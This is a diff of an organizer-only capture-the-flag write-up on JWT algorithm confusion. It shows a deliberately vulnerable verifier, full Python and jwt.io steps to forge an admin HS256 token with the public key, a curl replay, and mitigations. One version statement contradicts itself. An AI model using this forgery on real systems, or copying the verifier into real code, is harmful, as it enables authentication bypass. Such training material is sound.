@@ -1,144 +1,205 @@
-# Writeup: JWT Algorithm Confusion Challenge
+# WRITEUP — SOAP Company Token Queue
 
-## Challenge Overview
-This challenge demonstrates a classic JWT algorithm confusion vulnerability where an attacker can forge an admin token by exploiting the server's misuse of the RSA public key as an HMAC-SHA256 secret when the token header specifies `alg: HS256`.
+> **Organizer only.** Do not ship to players. Delete or move out of the
+> repo before each event.
 
-## Files Provided
-- `app.py`: The vulnerable Flask web application
-<<<<<<< HEAD
-- `public.pem`: RSA public key (distributed to players)
-- `private.pem`: RSA private key (included for completeness, normally kept secret)
-- `flag.txt`: The flag to be captured
-=======
-- `public.pem`: RSA public key (**distribute to players** - needed for verification and as HS256 secret)
-- `private.pem`: RSA private key (**keep secret on server only** - used to sign legitimate tokens, NOT distributed to players)
-- `flag.txt`: The flag to be captured (place on server, not distributed)
->>>>>>> f496a21 (soap3)
-- `requirements.txt`: Python dependencies
-- `Dockerfile`: Optional containerization
+## Summary
 
-## Vulnerability Details
-The application:
-1. Issues login tokens signed with RS256 using the private key (`/login` endpoint)
-2. Verifies tokens at the `/profile` endpoint with flawed logic:
-   - If token header specifies `alg: RS256`, verify with public key using RS256
-   - If token header specifies `alg: HS256`, verify with the **same public key** treated as an HMAC-SHA256 secret
+The `/profile` endpoint verifies JWTs by trusting the `alg` header from
+the token itself. When `alg=HS256`, it uses the RSA **public** key PEM
+as the HMAC secret. An attacker who holds the public key (it is served
+on the profile page and distributed as a download) can mint a
+forged `HS256` token with `role=admin` and walk right in.
 
-This misconfiguration allows an attacker to:
-1. Obtain a legitimate token for a normal user
-2. Decode it (no verification needed) to obtain the payload
-3. Modify the payload (e.g., change username to "admin")
-4. Change the header algorithm from `RS256` to `HS256`
-5. Re-sign the token using HS256 with the public key as the secret
-6. The server will accept this forged token because it uses the public key as the HMAC secret
+This is the classic **JWT algorithm confusion** vulnerability
+(CVE-2015-9235-class), adapted from the original RS256→HS256 confusion
+that bit `node-jsonwebtoken` a decade ago.
 
-## Exploitation Steps
+## Vulnerability location
 
-### Step 1: Obtain a legitimate token
-```bash
-curl -X POST http://localhost:5000/login \
-     -H "Content-Type: application/json" \
-     -d '{"username": "user"}'
+`utils/auth.py::verify_token`
+
+```python
+def verify_token(token: str):
+    ...
+    alg = header.get("alg")
+    if alg == ALG_RS256:
+        payload = jwt.decode(token, PUBLIC_KEY, algorithms=[ALG_RS256])
+        ...
+    if alg == ALG_HS256:
+        # Vulnerable branch: treat PEM as HMAC secret.
+        return _verify_hs256_manually(token, PUBLIC_KEY)
 ```
-Response:
+
+The verifier reads `alg` from the token's own header, then maps it to
+a key. RS256 keys and HS256 secrets are fundamentally different types
+(asymmetric vs symmetric), and the code reuses the same PEM bytes for
+both. A token can be re-signed under HS256 using the public key bytes
+as the HMAC secret, and the verifier will accept it.
+
+The hand-rolled `_verify_hs256_manually` exists only because modern
+PyJWT refuses to combine `algorithms=['HS256']` with a PEM-formatted
+key — see "Why the manual verifier" below. The vulnerable *logic* is
+still the application code's decision to trust `alg` and re-use the
+public key for both algorithms.
+
+## Exploitation
+
+### Step 1 — Get a legitimate token
+
+Visit `/queue`. The server mints a JWT and stores it in the
+`soap_token` HttpOnly cookie:
+
+```
+soap_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOi...
+```
+
+You can also extract it by inspecting the `Set-Cookie` header on
+`GET /queue`.
+
+### Step 2 — Decode the token
+
+Use any JWT decoder. The token has three parts:
+
+```
+header.payload.signature
+```
+
+Base64url-decode them:
+
+Header:
 ```json
-{"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.xxxxxx"}
+{"alg":"RS256","typ":"JWT"}
 ```
 
-### Step 2: Examine the token
-Decode the JWT (base64url) to see header and payload:
-- Header: `{"alg":"RS256","typ":"JWT"}`
-- Payload: `{"username":"user","exp":1719456000,...}`
+Payload:
+```json
+{"sub":"SOAP-150652","role":"user","queue":"SOAP-150652",
+ "iat":1763000000,"exp":1763003600}
+```
 
-### Step 3: Forge an admin token
-<<<<<<< HEAD
-Using Python with PyJWT:
-=======
-You can forge the token either with Python (if you have the environment) or directly via the jwt.io website.
+Note `alg=RS256`, `role=user`.
 
-#### Option A: Using Python with PyJWT
->>>>>>> f496a21 (soap3)
+### Step 3 — Obtain the public key
+
+Two ways:
+
+- Download `public.pem` (organizers ship it to players, as the file
+  must be distributed for the challenge to be solvable).
+- Or, on a logged-in session, the profile page exposes the `sub`
+  and `queue` fields, but the public key itself must be fetched
+  separately. In this challenge, it ships in the player bundle.
+
+### Step 4 — Forge an admin token
+
+Build a new token by hand. The header gets `alg=HS256`. The payload
+gets `role=admin` (and `sub=admin` for cosmetic reasons). The
+signature is HMAC-SHA256 over `header.payload` using the **entire
+`public.pem` file contents** (including `-----BEGIN`/`-----END`
+lines) as the secret.
+
+#### Python (manual, no PyJWT)
+
+```python
+import base64, hmac, hashlib, json
+
+PUB = open("public.pem", "rb").read()
+
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+header  = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
+payload = b64u(json.dumps({
+    "sub":"admin", "role":"admin", "queue":"SOAP-999999",
+    "iat":0, "exp":9999999999,
+}, separators=(",",":")).encode())
+signing_input = f"{header}.{payload}".encode()
+sig = hmac.new(PUB, signing_input, hashlib.sha256).digest()
+forged = f"{header}.{payload}.{b64u(sig)}"
+print(forged)
+```
+
+#### Python (PyJWT 2.6.0 or earlier)
+
+Older PyJWT (< 2.4.0) does not reject PEM-as-HMAC on encode:
+
 ```python
 import jwt
-
-# Load the public key (will be used as HMAC secret)
-with open('public.pem', 'r') as f:
-    public_key = f.read()
-
-# Original token from login (paste the token you received)
-original_token = "PASTE_TOKEN_HERE"
-
-# Decode without verification to get payload
-decoded = jwt.decode(original_token, options={"verify_signature": False})
-
-# Modify payload to impersonate admin
-decoded['username'] = 'admin'
-<<<<<<< HEAD
-=======
-decoded['role'] = 'admin'   # ensure role is admin
->>>>>>> f496a21 (soap3)
-
-# Create forged token with HS256 algorithm and public key as secret
-forged_token = jwt.encode(decoded, public_key, algorithm='HS256')
-
-print("Forged token:", forged_token)
+pub = open("public.pem").read()
+payload = {"sub":"admin","role":"admin","queue":"SOAP-999999",
+           "iat":0,"exp":9999999999}
+token = jwt.encode(payload, pub, algorithm="HS256")
+print(token)
 ```
 
-<<<<<<< HEAD
-=======
-#### Option B: Using jwt.io website
-1. Go to https://jwt.io
-2. Set **Algorithm** to `HS256`
-3. Paste the entire contents of `public.pem` into the **Secret** field (include the `-----BEGIN PUBLIC KEY-----` and `-----END PUBLIC KEY-----` lines)
-4. In the **Encoded** section, replace the payload with:
-   ```json
-   {
-     "sub": "admin",
-     "role": "admin",
-     "exp": <expiry from original token or a future timestamp>
-   }
-   ```
-   You can get the expiry by decoding the original token (without verification) – just copy the `exp` value.
-5. The **Signature** box will automatically generate a forged token.
-6. Copy the token from the **Encoded** section.
+#### jwt.io
 
+1. Open https://jwt.io
+2. Set Algorithm to `HS256`
+3. Paste the entire `public.pem` (with `-----BEGIN`/`-----END` lines)
+   into the "Verify Signature" secret box
+4. Edit the payload to `"sub":"admin"`, `"role":"admin"`
+5. Copy the resulting encoded token
 
->>>>>>> f496a21 (soap3)
-### Step 4: Use the forged token to get the flag
+### Step 5 — Use the forged token
+
+Set it as the `soap_token` cookie and visit `/profile`:
+
 ```bash
-curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:5000/profile
-```
-Response:
-```json
-{"message":"Welcome admin! Flag: HTB{jwt_alg_confusion_123}"}
+curl -b "soap_token=<forged>" http://localhost:5000/profile
 ```
 
-## Why This Works
-The server incorrectly treats the RSA public key as a symmetric secret for HS256 verification. Since the public key is known to everyone (it's distributed), an attacker can create a valid HMAC-SHA256 signature using it.
+Or in a browser: dev tools → Application → Cookies → edit
+`soap_token` to the forged value, then load `/profile`.
 
-## Prevention
-1. **Always specify expected algorithms** when decoding JWTs:
-   ```python
-   jwt.decode(token, key, algorithms=["RS256"])  # Explicitly expect only RS256
-   ```
-2. **Use separate keys** for symmetric and asymmetric algorithms.
-3. **Validate the algorithm** in the header matches what you expect before decoding.
-4. **Use a trusted JWT library** and follow its best practices.
+The admin profile renders the flag in the "Restricted token" block.
 
-## Difficulty Rating
-- **Easy**: The verification code is straightforward and the vulnerability is clear from the source.
-- **Medium**: To increase difficulty, you could:
-  - Hide the verification logic in a middleware or separate module
-  - Require chaining with another vulnerability (e.g., SSRF to steal the public key)
-  - Use a more complex key hierarchy
+### Step 6 — Read the flag
 
-## Learning Objectives
-- Understand JWT structure (header.payload.signature)
-- Recognize algorithm confusion attacks
-- Learn proper JWT validation practices
-- Experience exploiting a classic web vulnerability in a controlled environment
+`HTB{jwt_alg_confusion_123}` (or whatever the organizer set in
+`flag.txt`).
 
-## References
-- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
-- https://jwt.io/
-- OWASP JWT Attacks Cheat Sheet
+## Mitigation
+
+The fix is to pin the algorithm on the verify side. Never trust the
+`alg` header:
+
+```python
+# Safe: hard-code RS256 and the public key.
+payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
+```
+
+Additional defenses:
+
+- Use a library that does this for you (PyJWT >= 2.4.0 with
+  `algorithms=[...]` set, `python-jose` with `verify_signature=True`
+  pinned to a single algorithm, Authlib with explicit algorithm
+  allowlist).
+- Keep the public key and HMAC secret in separate key stores so a
+  leak of one cannot be cross-used.
+- Use a key ID (`kid`) header tied to a known key type so an HS256
+  request cannot resolve to an RSA verification key.
+
+## Why the manual verifier
+
+PyJWT 2.4.0 added a safety check that refuses `algorithms=['HS256']`
+when the key is PEM-formatted (it raises `InvalidKeyError: The
+specified key is an asymmetric key...`). That is a defense in depth
+for this class of bug in *application code*, but it does not apply
+to the player side — players can sign HS256 tokens however they like
+(`hmac` module, jwt.io, older PyJWT, hashcat, etc.).
+
+The application's verifier had to be hand-rolled (`_verify_hs256_manually`)
+to preserve the original vulnerable behavior for the challenge. In a
+real system you would *not* write this code; you would use the
+library's safe defaults.
+
+## Why this is a fair challenge
+
+- The public key is part of the standard JWT trust model — players
+  *must* receive it. The challenge tests whether the verifier
+  correctly distinguishes symmetric and asymmetric key material.
+- The application exposes everything needed to exploit (queue flow
+  to obtain a real token, profile page rendering user info that
+  hints at the JWT contents).
+- The intended path is short: decode, swap, sign, replay. Players
+  who reach for `jwt.io` can solve it in five minutes.
